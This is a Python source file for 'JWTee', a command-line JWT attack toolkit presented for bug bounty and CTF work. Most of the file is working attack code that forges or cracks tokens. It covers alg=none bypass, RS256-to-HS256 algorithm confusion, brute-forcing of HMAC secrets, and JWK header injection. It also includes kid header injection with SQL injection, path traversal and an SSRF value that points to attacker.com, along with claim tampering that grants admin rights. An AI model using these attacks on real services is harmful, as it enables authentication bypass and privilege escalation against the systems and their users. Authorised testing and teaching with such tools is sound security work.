#!/usr/bin/env python3
"""
JWTee - JWT Security Toolkit
Decode, encode, embed files, and attack JWT tokens for bug bounty and CTF.
Made by Alham Rizvi
"""

import sys
import json
import base64
import hmac
import hashlib
import time
import argparse
import itertools
import string
import os
import mimetypes
from datetime import datetime, timezone


# ── Colors ───────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"


def banner():
    print(r"""
     _ _  _  _____
    | | || ||_   _|___  ___
 _  | | || |_ | | / -_)/ -_)
| |_| |____/  |_| \___|\___|

  JWTee - JWT Security Toolkit
  Decode  Encode  File-Embed  Attack
  Made by Alham Rizvi
""")


# ── Base64url helpers ─────────────────────────────────────────
def b64url_decode(data: str) -> bytes:
    data = data.replace("-", "+").replace("_", "/")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.b64decode(data)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def json_b64(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


# ── JWT Parser ────────────────────────────────────────────────
def split_jwt(token: str):
    token = token.strip()
    # Split on first 2 dots only — keeps large file payloads intact
    parts = token.split(".", 2)
    if len(parts) not in (2, 3):
        raise ValueError("Invalid JWT: must have 2 or 3 parts separated by '.'")
    if not parts[0] or not parts[1]:
        raise ValueError("Invalid JWT: empty header or payload")
    return parts


def decode_part(part: str) -> dict:
    raw = b64url_decode(part)
    return json.loads(raw.decode())


def format_timestamp(ts):
    try:
        dt = datetime.fromtimestamp(int(ts), tz=timezone.utc)
        return f"{ts}  ({dt.strftime('%Y-%m-%d %H:%M:%S UTC')})"
    except Exception:
        return str(ts)


def hr(char="─", width=60):
    print(C.DIM + char * width + C.RESET)


# ── DECODE ────────────────────────────────────────────────────
def cmd_decode(token: str, verify: bool = False, secret: str = None):
    parts = split_jwt(token)

    print(f"\n{C.BOLD}Decoded JWT{C.RESET}")
    hr()

    header  = decode_part(parts[0])
    payload = decode_part(parts[1])
    sig_raw = parts[2] if len(parts) == 3 else ""

    print(f"\n{C.BOLD}Header{C.RESET}")
    for k, v in header.items():
        print(f"  {C.CYAN}{k}{C.RESET}: {v}")

    print(f"\n{C.BOLD}Payload{C.RESET}")
    sensitive_keys = {"password", "pass", "pwd", "secret", "token", "key", "apikey", "api_key"}
    time_keys      = {"exp", "iat", "nbf"}
    role_keys      = {"role", "admin", "group", "scope", "permission", "is_admin"}

    for k, v in payload.items():
        val_str = str(v)
        flag    = ""

        if k in time_keys:
            val_str = format_timestamp(v)
            if k == "exp":
                try:
                    if int(v) < time.time():
                        flag = f"  {C.RED}[EXPIRED]{C.RESET}"
                    else:
                        flag = f"  {C.GREEN}[valid]{C.RESET}"
                except Exception:
                    pass
        elif k.lower() in sensitive_keys:
            flag = f"  {C.RED}[SENSITIVE]{C.RESET}"
        elif k.lower() in role_keys:
            flag = f"  {C.YELLOW}[interesting]{C.RESET}"

        print(f"  {C.CYAN}{k}{C.RESET}: {val_str}{flag}")

    print(f"\n{C.BOLD}Signature{C.RESET}")
    if sig_raw:
        display = sig_raw[:48] + "..." if len(sig_raw) > 48 else sig_raw
        print(f"  {C.DIM}{display}{C.RESET}")
    else:
        print(f"  {C.RED}(none){C.RESET}")

    alg = header.get("alg", "").upper()
    print(f"\n{C.BOLD}Algorithm{C.RESET}: {alg}")
    if alg == "NONE" or not sig_raw:
        print(f"  {C.RED}! Algorithm is 'none' — signature not verified{C.RESET}")

    # HMAC signature verify — treat "" as a valid secret to test
    if verify and secret is not None and alg in ("HS256", "HS384", "HS512"):
        hash_map      = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig  = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
        actual_sig    = b64url_decode(sig_raw)
        if hmac.compare_digest(expected_sig, actual_sig):
            print(f"\n  {C.GREEN}Signature VALID with provided secret{C.RESET}")
        else:
            print(f"\n  {C.RED}Signature INVALID — wrong secret or tampered token{C.RESET}")

    print()
    return header, payload


# ── ENCODE ────────────────────────────────────────────────────
def cmd_encode(payload_json: str, secret: str = "", alg: str = "HS256",
               extra_headers: dict = None):
    alg = alg.upper()
    header = {"alg": alg, "typ": "JWT"}
    if extra_headers:
        header.update(extra_headers)

    try:
        payload = json.loads(payload_json)
    except json.JSONDecodeError as e:
        print(f"{C.RED}Invalid JSON payload: {e}{C.RESET}")
        return

    h = json_b64(header)
    p = json_b64(payload)
    signing_input = f"{h}.{p}".encode()

    if alg == "NONE":
        token = f"{h}.{p}."
    elif alg in ("HS256", "HS384", "HS512"):
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig   = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
        token = f"{h}.{p}.{b64url_encode(sig)}"
    else:
        print(f"{C.YELLOW}Algorithm '{alg}' requires RSA/EC keys — generating unsigned token{C.RESET}")
        token = f"{h}.{p}."

    print(f"\n{C.BOLD}Encoded JWT{C.RESET}")
    hr()
    print(f"\n{C.CYAN}{token}{C.RESET}\n")
    # Clean copy for piping
    print(token)
    print()
    return token


# ── ATTACKS ───────────────────────────────────────────────────

def attack_none(token: str):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    print(f"\n{C.BOLD}Attack: none Algorithm Bypass{C.RESET}")
    hr()
    print("  Removes signature and sets alg to 'none' variants\n")

    for variant in ["none", "None", "NONE", "nOnE"]:
        header["alg"] = variant
        h = json_b64(header)
        p = json_b64(payload)
        t = f"{h}.{p}."
        print(f"  alg={variant}")
        print(f"  {C.CYAN}{t}{C.RESET}\n")


def attack_alg_confusion(token: str, pubkey_path: str = None):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    print(f"\n{C.BOLD}Attack: Algorithm Confusion (RS256 -> HS256){C.RESET}")
    hr()

    orig_alg = header.get("alg", "").upper()
    if orig_alg != "RS256":
        print(f"  {C.YELLOW}Note: original alg is '{orig_alg}', not RS256 — may still work{C.RESET}")

    if not pubkey_path:
        print("""
  How to exploit:
  1. Grab the server's RSA public key from JWKS endpoint or /api/keys
  2. Save it as pubkey.pem
  3. Run: python3 JWTee.py attack --token <token> --type alg_confusion --pubkey pubkey.pem

  The server signs with RS256 private key.
  If you sign with HS256 using the public key as the HMAC secret,
  a vulnerable library will verify it as valid because it trusts
  the algorithm parameter in the header.
""")
        return

    if not os.path.isfile(pubkey_path):
        print(f"  {C.RED}Public key file not found: {pubkey_path}{C.RESET}")
        return

    with open(pubkey_path, "rb") as f:
        pubkey_bytes = f.read()

    header["alg"] = "HS256"
    h = json_b64(header)
    p = json_b64(payload)
    signing_input = f"{h}.{p}".encode()
    sig   = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
    token = f"{h}.{p}.{b64url_encode(sig)}"

    print(f"\n  Confused token (HS256 signed with RSA public key):")
    print(f"\n  {C.CYAN}{token}{C.RESET}\n")
    print(f"  {token}\n")


def attack_brute(token: str, wordlist_path: str = None, charset: str = None, max_len: int = 6):
    parts  = split_jwt(token)
    header = decode_part(parts[0])
    alg    = header.get("alg", "HS256").upper()

    if alg not in ("HS256", "HS384", "HS512"):
        print(f"  {C.RED}Brute-force only works on HMAC algorithms (HS256/384/512){C.RESET}")
        return

    hash_map      = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    actual_sig    = b64url_decode(parts[2])

    def check(secret: str) -> bool:
        expected = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
        return hmac.compare_digest(expected, actual_sig)

    print(f"\n{C.BOLD}Attack: Secret Brute-Force ({alg}){C.RESET}")
    hr()

    if wordlist_path:
        print(f"  Mode: dictionary — {wordlist_path}\n")
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                for i, line in enumerate(f):
                    secret = line.strip()
                    if check(secret):
                        print(f"  {C.GREEN}SECRET FOUND: '{secret}'{C.RESET}")
                        print(f"  Tested {i+1} candidates\n")
                        return
                    if i % 5000 == 0 and i > 0:
                        print(f"  {C.DIM}Tested {i:,} candidates...{C.RESET}", end="\r")
            print(f"\n  {C.RED}Secret not found in wordlist{C.RESET}\n")
        except FileNotFoundError:
            print(f"  {C.RED}Wordlist not found: {wordlist_path}{C.RESET}")
    else:
        chars = charset or (string.ascii_letters + string.digits)
        print(f"  Mode: brute-force (len 1-{max_len}, charset size {len(chars)})\n")
        count = 0
        for length in range(1, max_len + 1):
            for combo in itertools.product(chars, repeat=length):
                secret = "".join(combo)
                count += 1
                if check(secret):
                    print(f"  {C.GREEN}SECRET FOUND: '{secret}'{C.RESET}")
                    print(f"  Tested {count:,} candidates\n")
                    return
        print(f"\n  {C.RED}Secret not found (tested {count:,} candidates){C.RESET}\n")


def attack_kid_injection(token: str, kid_payload: str = None):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    print(f"\n{C.BOLD}Attack: kid Header Injection{C.RESET}")
    hr()
    print("  Tokens signed with empty string (common for path traversal to /dev/null)\n")

    payloads = {
        "SQL Injection (MySQL/MSSQL)" : "' UNION SELECT 'hacked' --",
        "SQL Injection (SQLite)"      : "' UNION SELECT 'hacked'--",
        "Path Traversal (Linux)"      : "../../../../dev/null",
        "Path Traversal (null byte)"  : "../../../../dev/null\x00",
        "SSRF via URL"                : "http://attacker.com/key.pem",
        "Direct /dev/null"            : "/dev/null",
        "Deep traversal /dev/null"    : "../../../../../../dev/null",
    }

    if kid_payload:
        payloads = {"Custom": kid_payload}

    for label, kp in payloads.items():
        header["kid"] = kp
        h = json_b64(header)
        p = json_b64(payload)
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
        t   = f"{h}.{p}.{b64url_encode(sig)}"
        print(f"  {label}")
        print(f"  kid: {C.YELLOW}{kp}{C.RESET}")
        print(f"  {C.CYAN}{t}{C.RESET}\n")


def attack_claim_tamper(token: str, claims: dict = None, secret: str = "", alg: str = None):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    print(f"\n{C.BOLD}Attack: Claim Tampering{C.RESET}")
    hr()

    default_tamper = {
        "role" : "admin",
        "admin": True,
        "exp"  : int(time.time()) + 31536000,
        "iat"  : int(time.time()),
    }

    tampering = claims if claims else default_tamper
    alg_used  = (alg or header.get("alg", "HS256")).upper()

    print(f"  Changes:\n")
    for k, v in tampering.items():
        old = payload.get(k, "<not set>")
        payload[k] = v
        print(f"  {C.CYAN}{k}{C.RESET}: {C.DIM}{old}{C.RESET}  ->  {C.GREEN}{v}{C.RESET}")

    header["alg"] = alg_used
    h = json_b64(header)
    p = json_b64(payload)
    signing_input = f"{h}.{p}".encode()

    if alg_used in ("HS256", "HS384", "HS512"):
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig = hmac.new(secret.encode(), signing_input, hash_map[alg_used]).digest()
        t   = f"{h}.{p}.{b64url_encode(sig)}"
    else:
        t = f"{h}.{p}."

    print(f"\n  Tampered token:")
    print(f"\n  {C.CYAN}{t}{C.RESET}\n")
    print(f"  {t}\n")
    return t


def attack_jwk_inject(token: str, secret: str = "attacker_secret"):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    print(f"\n{C.BOLD}Attack: JWK Header Injection{C.RESET}")
    hr()

    fake_jwk = {
        "kty": "oct",
        "k"  : b64url_encode(secret.encode()),
        "alg": "HS256",
        "use": "sig"
    }
    header["jwk"] = fake_jwk
    header["alg"] = "HS256"

    h = json_b64(header)
    p = json_b64(payload)
    signing_input = f"{h}.{p}".encode()
    sig   = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    token = f"{h}.{p}.{b64url_encode(sig)}"

    print(f"  Embedded JWK:")
    print(f"  {C.DIM}{json.dumps(fake_jwk, indent=4)}{C.RESET}")
    print(f"\n  JWK-injected token:")
    print(f"\n  {C.CYAN}{token}{C.RESET}\n")
    print(f"  {token}")
    print(f"""
  Note: For RSA-based JWK injection — generate an RSA keypair,
  embed the public key in the JWK header, and sign with the private key.
  Vulnerable libraries will trust the embedded JWK instead of their own keys.
  Reference: PortSwigger JWT attacks lab
""")


def attack_summary(token: str):
    parts   = split_jwt(token)
    header  = decode_part(parts[0])
    payload = decode_part(parts[1])
    alg     = header.get("alg", "").upper()

    print(f"\n{C.BOLD}Bug Bounty / CTF Checklist{C.RESET}")
    hr()

    checks = [
        ("alg=none bypass",
         alg in ("NONE", ""),
         "Remove signature and set alg to none/None/NONE"),
        ("Weak HMAC secret",
         alg in ("HS256", "HS384", "HS512"),
         "Brute-force with rockyou.txt or jwt-cracker"),
        ("Algorithm confusion RS256 -> HS256",
         alg == "RS256",
         "Grab public key from JWKS, sign with HS256(pubkey)"),
        ("kid header injection",
         "kid" in header,
         "Try SQL injection or path traversal in kid field"),
        ("JWK / jku header injection",
         True,
         "Inject your own JWK into header or point jku to attacker server"),
        ("Expired token accepted",
         payload.get("exp") and int(payload.get("exp", 0)) < time.time(),
         "Server may not validate exp — replay the expired token"),
        ("Privilege escalation via claims",
         any(k in payload for k in ("role", "admin", "group", "scope")),
         "Tamper role/admin/scope claims and re-sign"),
        ("Sensitive data in payload",
         any(k.lower() in {"password", "secret", "key", "apikey"} for k in payload),
         "PII or secrets leaked in JWT payload — report info disclosure"),
    ]

    for label, hit, advice in checks:
        icon  = f"{C.GREEN}[+]{C.RESET}" if hit else f"{C.DIM}[ ]{C.RESET}"
        color = C.YELLOW if hit else C.DIM
        print(f"  {icon} {color}{label}{C.RESET}")
        if hit:
            print(f"      {C.CYAN}-> {advice}{C.RESET}")

    print()


# ── FILE ENCODE / DECODE ──────────────────────────────────────

def cmd_encode_file(filepath: str, secret: str = "", alg: str = "HS256",
                    extra_headers: dict = None, output: str = None):
    """
    Embed any file (binary or text) into a JWT payload.
    Payload fields: file_name, file_type, file_size, file_hash_sha256, file_data, iat
    """
    alg = alg.upper()

    if not os.path.isfile(filepath):
        print(f"{C.RED}File not found: {filepath}{C.RESET}")
        return

    with open(filepath, "rb") as f:
        raw = f.read()

    file_name            = os.path.basename(filepath)
    file_size            = len(raw)
    file_hash            = hashlib.sha256(raw).hexdigest()
    mime_type, _         = mimetypes.guess_type(filepath)
    mime_type            = mime_type or "application/octet-stream"
    file_data            = b64url_encode(raw)

    payload = {
        "file_name"        : file_name,
        "file_type"        : mime_type,
        "file_size"        : file_size,
        "file_hash_sha256" : file_hash,
        "file_data"        : file_data,
        "iat"              : int(time.time()),
    }

    header = {"alg": alg, "typ": "JWT", "cty": "file"}
    if extra_headers:
        header.update(extra_headers)

    h = json_b64(header)
    p = json_b64(payload)
    signing_input = f"{h}.{p}".encode()

    if alg == "NONE":
        token = f"{h}.{p}."
    elif alg in ("HS256", "HS384", "HS512"):
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig   = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
        token = f"{h}.{p}.{b64url_encode(sig)}"
    else:
        print(f"{C.YELLOW}Algorithm '{alg}' requires RSA/EC — generating unsigned token{C.RESET}")
        token = f"{h}.{p}."

    print(f"\n{C.BOLD}File -> JWT{C.RESET}")
    hr()
    print(f"  File   : {file_name}")
    print(f"  MIME   : {mime_type}")
    print(f"  Size   : {file_size:,} bytes")
    print(f"  SHA256 : {file_hash}")
    print(f"  Alg    : {alg}")

    if output:
        with open(output, "w") as f:
            f.write(token)
        print(f"\n  {C.GREEN}Token saved to: {output}{C.RESET}\n")
    else:
        print(f"\n  Token:\n")
        print(f"  {C.CYAN}{token}{C.RESET}\n")
        # Clean single-line copy
        print(f"  {token}\n")

    return token


def cmd_decode_file(token: str, output_dir: str = ".", secret: str = "",
                    verify: bool = False):
    """
    Extract a file embedded in a JWT by cmd_encode_file.
    """
    parts = split_jwt(token)

    print(f"\n{C.BOLD}JWT -> File{C.RESET}")
    hr()

    header  = decode_part(parts[0])
    payload = decode_part(parts[1])

    if "file_data" not in payload:
        print(f"  {C.RED}This JWT does not contain embedded file data.{C.RESET}")
        print(f"  Use the decode command to inspect a regular JWT.\n")
        return

    alg       = header.get("alg", "").upper()
    file_name = payload.get("file_name", "recovered_file")
    file_type = payload.get("file_type", "unknown")
    file_size = payload.get("file_size", "?")
    file_hash = payload.get("file_hash_sha256", "")
    file_data = payload.get("file_data", "")
    iat       = payload.get("iat", 0)

    print(f"  File      : {file_name}")
    print(f"  MIME      : {file_type}")
    if isinstance(file_size, int):
        print(f"  Size      : {file_size:,} bytes")
    else:
        print(f"  Size      : {file_size}")
    print(f"  SHA256    : {file_hash}")
    print(f"  Algorithm : {alg}")
    if iat:
        print(f"  Embedded  : {format_timestamp(iat)}")

    # HMAC verify
    sig_raw = parts[2] if len(parts) == 3 else ""
    if verify and secret is not None and alg in ("HS256", "HS384", "HS512"):
        hash_map      = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig  = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
        actual_sig    = b64url_decode(sig_raw)
        if hmac.compare_digest(expected_sig, actual_sig):
            print(f"  {C.GREEN}Signature VALID{C.RESET}")
        else:
            print(f"  {C.RED}Signature INVALID — token may be tampered{C.RESET}")

    # Recover bytes
    try:
        raw_bytes = b64url_decode(file_data)
    except Exception as e:
        print(f"  {C.RED}Failed to decode file_data: {e}{C.RESET}\n")
        return

    # SHA-256 integrity check
    actual_hash = hashlib.sha256(raw_bytes).hexdigest()
    if file_hash and actual_hash != file_hash:
        print(f"\n  {C.RED}SHA-256 MISMATCH — file may be corrupted or tampered{C.RESET}")
        print(f"  Expected : {file_hash}")
        print(f"  Got      : {actual_hash}")
    elif file_hash:
        print(f"  {C.GREEN}SHA-256 integrity verified{C.RESET}")

    os.makedirs(output_dir, exist_ok=True)
    out_path = os.path.join(output_dir, file_name)
    with open(out_path, "wb") as f:
        f.write(raw_bytes)

    print(f"\n  {C.GREEN}File recovered -> {out_path}{C.RESET}")
    print(f"  Size on disk: {len(raw_bytes):,} bytes\n")
    return out_path


# ── CLI ───────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        description="JWTee — JWT Security Toolkit by Alham Rizvi",
        formatter_class=argparse.RawTextHelpFormatter
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # decode
    p_dec = sub.add_parser("decode", help="Decode and inspect any JWT token")
    p_dec.add_argument("token",    help="JWT string")
    p_dec.add_argument("--verify", action="store_true", help="Verify HMAC signature")
    p_dec.add_argument("--secret", default="", help="Secret for verification")

    # encode
    p_enc = sub.add_parser("encode", help="Sign a JSON payload into a JWT")
    p_enc.add_argument("payload",  help='JSON string, e.g. \'{"sub":"admin","role":"admin"}\'')
    p_enc.add_argument("--secret", default="", help="HMAC secret (empty = none-alg)")
    p_enc.add_argument("--alg",    default="HS256", help="HS256 / HS384 / HS512 / none")
    p_enc.add_argument("--header", default=None, help='Extra header JSON, e.g. \'{"kid":"1"}\'')

    # attack
    p_atk = sub.add_parser("attack", help="Run a JWT attack")
    p_atk.add_argument("--token",    required=True)
    p_atk.add_argument("--type",     required=True,
        choices=["none", "alg_confusion", "brute", "kid", "jwk", "tamper", "all"],
        help=(
            "none          — Remove signature, set alg=none variants\n"
            "alg_confusion — RS256->HS256 with RSA public key\n"
            "brute         — Crack HMAC secret via dictionary or brute\n"
            "kid           — Inject SQL/path traversal into kid header\n"
            "jwk           — Embed attacker JWK in header\n"
            "tamper        — Rewrite claims and re-sign\n"
            "all           — Run all attacks + checklist"
        ))
    p_atk.add_argument("--pubkey",   default=None, help="RSA public key PEM file (alg_confusion)")
    p_atk.add_argument("--wordlist", default=None, help="Wordlist file (brute)")
    p_atk.add_argument("--charset",  default=None, help="Characters for raw brute-force")
    p_atk.add_argument("--max-len",  type=int, default=5, help="Max length for raw brute-force")
    p_atk.add_argument("--kid",      default=None, help="Custom kid injection string")
    p_atk.add_argument("--secret",   default="", help="Secret for tamper re-signing")
    p_atk.add_argument("--claims",   default=None, help='Claims to overwrite, e.g. \'{"role":"admin"}\'')

    # encode-file
    p_ef = sub.add_parser("encode-file", help="Embed any file into a JWT token")
    p_ef.add_argument("file",      help="File to embed (txt, py, jpg, zip, bin...)")
    p_ef.add_argument("--secret",  default="", help="HMAC secret")
    p_ef.add_argument("--alg",     default="HS256", help="HS256 / HS384 / HS512 / none")
    p_ef.add_argument("--header",  default=None, help='Extra header JSON')
    p_ef.add_argument("--output",  default=None, help="Write token to this file")

    # decode-file
    p_df = sub.add_parser("decode-file", help="Extract a file embedded in a JWT")
    p_df.add_argument("token",     help="JWT string, or @path/to/token.jwt")
    p_df.add_argument("--out",     default=".", help="Output directory (default: .)")
    p_df.add_argument("--verify",  action="store_true", help="Verify HMAC signature")
    p_df.add_argument("--secret",  default="", help="Secret for verification")

    # checklist
    p_chk = sub.add_parser("checklist", help="Bug bounty attack surface checklist for a JWT")
    p_chk.add_argument("token", help="JWT string")

    args = parser.parse_args()

    if args.command == "decode":
        cmd_decode(args.token, args.verify, args.secret)

    elif args.command == "encode":
        extra = json.loads(args.header) if args.header else None
        cmd_encode(args.payload, args.secret, args.alg, extra)

    elif args.command == "attack":
        t  = args.token
        at = args.type

        if at in ("none", "all"):
            attack_none(t)
        if at in ("alg_confusion", "all"):
            attack_alg_confusion(t, args.pubkey)
        if at in ("brute", "all"):
            attack_brute(t, args.wordlist, args.charset, args.max_len)
        if at in ("kid", "all"):
            attack_kid_injection(t, args.kid)
        if at in ("jwk", "all"):
            attack_jwk_inject(t, args.secret or "attacker_secret")
        if at in ("tamper", "all"):
            claims = json.loads(args.claims) if args.claims else None
            attack_claim_tamper(t, claims, args.secret)
        if at == "all":
            attack_summary(t)

    elif args.command == "encode-file":
        extra = json.loads(args.header) if args.header else None
        cmd_encode_file(args.file, args.secret, args.alg, extra, args.output)

    elif args.command == "decode-file":
        token = args.token
        if token.startswith("@"):
            with open(token[1:], "r") as f:
                token = f.read().strip()
        cmd_decode_file(token, args.out, args.secret, args.verify)

    elif args.command == "checklist":
        cmd_decode(args.token)
        attack_summary(args.token)


if __name__ == "__main__":
    main()
